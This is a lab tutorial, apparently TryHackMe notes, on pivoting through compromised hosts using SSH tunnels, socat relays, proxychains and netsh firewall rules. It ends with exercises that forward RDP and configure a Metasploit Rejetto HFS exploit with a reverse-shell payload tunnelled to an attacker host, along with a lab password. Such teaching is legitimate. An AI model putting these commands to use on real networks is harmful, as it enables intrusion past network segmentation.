# Port Forwarding Techniques

Most lateral movement techniques require specific ports to be available for an attacker. In real-world networks, administrators may block some of these ports for security reasons or implement network segmentation, preventing access to SMB, RDP, WinRM, or RPC ports.

To bypass these restrictions, port forwarding techniques can be used. These techniques involve using a compromised host as a jump box to pivot to other hosts. Some machines may have more network permissions than others, depending on their roles and network service requirements.

---

## SSH Tunneling

SSH has built-in functionality for port forwarding through SSH Tunneling. While SSH was traditionally associated with Linux systems, Windows now ships with the OpenSSH client by default, making it widely available.

### SSH Remote Port Forwarding

Remote port forwarding allows a reachable port from the SSH client (e.g., PC-1) to be projected into a remote SSH server (e.g., the attacker's machine). For example:

```bash
C:\> ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N
```

This command forwards port 3389 on the server to the attacker's machine through PC-1. The `-R` switch specifies remote port forwarding, and the `-N` switch prevents requesting a shell.

### SSH Local Port Forwarding

Local port forwarding "pulls" a port from an SSH server into the SSH client. For example:

```bash
C:\> ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N
```

This command forwards port 80 from the attacker's machine to PC-1. A firewall rule may be required to allow incoming connections:

```bash
netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80
```

---

## Port Forwarding with `socat`

`socat` can be used for port forwarding when SSH is unavailable. For example:

```bash
socat TCP4-LISTEN:1234,fork TCP4:1.1.1.1:4321
```

To forward port 3389 on the server using PC-1 as a pivot:

```bash
C:\> socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389
```

A firewall rule may be needed:

```bash
netsh advfirewall firewall add rule name="Open Port 3389" dir=in action=allow protocol=TCP localport=3389
```

---

## Dynamic Port Forwarding and SOCKS

Dynamic port forwarding allows scanning multiple ports or hosts through a pivot host using a SOCKS proxy. For example:

```bash
C:\> ssh tunneluser@1.1.1.1 -R 9050 -N
```

Configure `proxychains` to use the SOCKS proxy:

```plaintext
[ProxyList]
socks4  127.0.0.1 9050
```

Run commands through the proxy:

```bash
proxychains curl http://pxeboot.za.tryhackme.com
```

---

## Practical Exercises

### Exercise 1: Forwarding RDP with `socat`

On `THMJMP2`, forward the RDP port to make it accessible from the attacker's machine:

```bash
C:\tools\socat\> socat TCP4-LISTEN:13389,fork TCP4:THMIIS.za.tryhackme.com:3389
```

Connect via RDP:

```bash
xfreerdp /v:THMJMP2.za.tryhackme.com:13389 /u:t1_thomas.moore /p:MyPazzw3rd2020
```

### Exercise 2: Exploiting Rejetto HFS

Forward ports for the exploit:

```bash
C:\> ssh tunneluser@ATTACKER_IP -R 8888:thmdc.za.tryhackme.com:80 -L *:6666:127.0.0.1:6666 -L *:7878:127.0.0.1:7878 -N
```

Configure Metasploit:

```bash
msf6 > use rejetto_hfs_exec
msf6 exploit(windows/http/rejetto_hfs_exec) > set payload windows/shell_reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) > set lhost thmjmp2.za.tryhackme.com
msf6 exploit(windows/http/rejetto_hfs_exec) > set ReverseListenerBindAddress 127.0.0.1
msf6 exploit(windows/http/rejetto_hfs_exec) > set lport 7878
msf6 exploit(windows/http/rejetto_hfs_exec) > set srvhost 127.0.0.1
msf6 exploit(windows/http/rejetto_hfs_exec) > set srvport 6666
msf6 exploit(windows/http/rejetto_hfs_exec) > set rhosts 127.0.0.1
msf6 exploit(windows/http/rejetto_hfs_exec) > set rport 8888
msf6 exploit(windows/http/rejetto_hfs_exec) > exploit
```